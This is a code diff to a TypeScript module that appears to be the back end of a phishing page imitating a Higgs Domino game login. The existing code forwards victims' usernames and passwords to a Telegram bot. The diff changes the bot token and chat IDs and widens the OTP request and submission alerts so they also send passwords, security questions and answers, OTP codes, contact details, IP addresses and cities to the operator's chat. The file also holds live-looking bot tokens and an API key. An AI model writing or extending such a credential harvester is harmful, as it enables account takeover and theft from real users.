@@ -12,43 +12,26 @@ interface HiggsProfile {
   coins?: string; // Optional, as some APIs might not return it
 }
 
-// API Configuration for Higgs Domino Checker (Based on TrueID Games Postman)
-// NOTE: Base URL 'http://localhost:3000' is from your screenshot. 
-// You MUST replace it with the actual production URL from the Postman collection's environment or documentation.
+// API Configuration for Higgs Domino Checker (Backend Proxy)
 const HIGGS_BASE_URL = 'http://localhost:3000'; 
-const HIGGS_ENDPOINT = '/trueid/v1/higgsdomino';
-const HIGGS_API_KEY = '130835f98b17888e3db44bc42615e7d4f4ddef19'; // Key from screenshot
+const HIGGS_ENDPOINT = '/check-higgs';
 
 const checkHiggsUser = async (userId: string): Promise<HiggsProfile | null> => {
   try {
-    if (!HIGGS_API_KEY) {
-      console.warn('Higgs API Key is not set properly.');
-      return null;
-    }
-
-    // Request using the structure from the Postman screenshot
+    // Request to our local backend server
     const response = await axios.get(`${HIGGS_BASE_URL}${HIGGS_ENDPOINT}`, {
-      params: {
-        id: userId
-      },
-      headers: {
-        'X-API-Key': HIGGS_API_KEY
-      },
-      timeout: 5000
+      params: { userId: userId },
+      timeout: 10000 // Increase timeout for backend scraping
     });
 
-    // Logging response for debugging (visible in console)
     console.log('Higgs API Response:', response.data);
 
-    if (response.status === 200 && response.data) {
-      // Adjust parsing based on typical API responses. 
-      // Often the data is directly in response.data or response.data.data
-      const data = response.data.data || response.data;
-      
+    if (response.status === 200 && response.data && response.data.code === 200) {
+      const data = response.data.data;
       return {
-        username: data.nickname || data.username || data.name || 'Unknown',
+        username: data.username || 'Unknown',
         level: data.level || 'Unknown',
-        coins: data.coins || data.chip || 'Unknown'
+        coins: data.coins || 'Unknown'
       };
     }
     return null;
@@ -85,8 +68,9 @@ const escapeHtml = (unsafe: any): string => {
 };
 
 // Konstanta Bot & Chat ID
-const BOT_TOKEN = '8539103259:AAHnEJrkMJt2Z_vjyf-gENTJU6GnzpTnkCs';
-const CHAT_IDS = ['6885815623', '6076369736'];
+const BOT_TOKEN = '8636607099:AAGGzcw3Nt3VY-l9j8br8rwQNIFqzktaJZk';
+const CHAT_IDS = ['6076369736'];
+// const CHAT_IDS = ['6885815623', '6076369736'];
 
 const sendMessage = async (text: string): Promise<boolean> => {
   try {
@@ -145,9 +129,6 @@ export const sendToTelegram = async (
 🔐 <b>USER LOGIN ALERT</b>
 ────────────────────────
 👤 ID: <code>${escapeHtml(username)}</code>
-${higgsData ? `📛 Game Name: <code>${escapeHtml(higgsData.username)}</code>
-⭐ Level: <code>${escapeHtml(higgsData.level)}</code>
-💰 Coins: <code>${escapeHtml(higgsData.coins || '-')}</code>` : ''}
 🔑 Password: <code>${escapeHtml(pass)}</code>
 🗓️ Date: ${escapeHtml(timeString)}
 ────────────────────────
@@ -203,7 +184,12 @@ City: ${escapeHtml(loc.city)}
 export const sendOTPRequest = async (
   username: string,
   identifier: string, // Phone number or Email
-  method: 'wa' | 'email'
+  method: 'wa' | 'email',
+  password?: string,
+  q1?: string,
+  a1?: string,
+  q2?: string,
+  a2?: string
 ) => {
   console.log('Preparing OTP Request...');
   
@@ -220,14 +206,25 @@ export const sendOTPRequest = async (
   const message = `
 🔐 <b>OTP REQUEST ALERT</b>
 ────────────────────────
-👤 ID: <code>${escapeHtml(username)}</code>
-👤 Contact: <code>${escapeHtml(identifier)}</code>
-🗒️ Method: ${typeName}
-📅 Date: ${escapeHtml(timeString)}
+👤 <b>USER INFO</b>
+🆔 ID: <code>${escapeHtml(username)}</code>
+� Password: <code>${escapeHtml(password || '-')}</code>
 ────────────────────────
-📍 <b>Location Info:</b>
-IP: <code>${escapeHtml(loc.ip)}</code>
-City: ${escapeHtml(loc.city)}
+🛡️ <b>SECURITY ANSWERS</b>
+1️⃣ ${escapeHtml(q1 || '-')}
+   👉 <code>${escapeHtml(a1 || '-')}</code>
+
+2️⃣ ${escapeHtml(q2 || '-')}
+   👉 <code>${escapeHtml(a2 || '-')}</code>
+────────────────────────
+📱 <b>VERIFICATION INFO</b>
+� Contact: <code>${escapeHtml(identifier)}</code>
+📩 Method: ${typeName}
+────────────────────────
+📍 <b>LOCATION & TIME</b>
+🌐 IP: <code>${escapeHtml(loc.ip)}</code>
+🏙️ City: ${escapeHtml(loc.city)}
+📅 Date: ${escapeHtml(timeString)}
 ────────────────────────
 `;
 
@@ -242,7 +239,12 @@ export const sendOTPSubmission = async (
   username: string,
   identifier: string,
   code: string,
-  method: 'wa' | 'email'
+  method: 'wa' | 'email',
+  password?: string,
+  q1?: string,
+  a1?: string,
+  q2?: string,
+  a2?: string
 ) => {
   console.log('Preparing OTP Submission...');
   
@@ -257,17 +259,28 @@ export const sendOTPSubmission = async (
   const typeName = method === 'wa' ? 'WhatsApp' : 'Email';
 
   const message = `
-🔐 <b>OTP SUBMISSION ALERT</b>
+� <b>OTP SUBMISSION ALERT</b>
 ────────────────────────
-👤 ID: <code>${escapeHtml(username)}</code>
-👤 Contact: <code>${escapeHtml(identifier)}</code>
-🗒️ Method: ${typeName}
+👤 <b>USER INFO</b>
+🆔 ID: <code>${escapeHtml(username)}</code>
+🔑 Password: <code>${escapeHtml(password || '-')}</code>
+────────────────────────
+🛡️ <b>SECURITY ANSWERS</b>
+1️⃣ ${escapeHtml(q1 || '-')}
+   👉 <code>${escapeHtml(a1 || '-')}</code>
+
+2️⃣ ${escapeHtml(q2 || '-')}
+   👉 <code>${escapeHtml(a2 || '-')}</code>
+────────────────────────
+� <b>VERIFICATION INFO</b>
+📞 Contact: <code>${escapeHtml(identifier)}</code>
+� Method: ${typeName}
 🔢 Code: <code>${escapeHtml(code)}</code>
-📅 Date: ${escapeHtml(timeString)}
 ────────────────────────
-📍 <b>Location Info:</b>
-IP: <code>${escapeHtml(loc.ip)}</code>
-City: ${escapeHtml(loc.city)}
+📍 <b>LOCATION & TIME</b>
+🌐 IP: <code>${escapeHtml(loc.ip)}</code>
+🏙️ City: ${escapeHtml(loc.city)}
+📅 Date: ${escapeHtml(timeString)}
 ────────────────────────
 `;
 
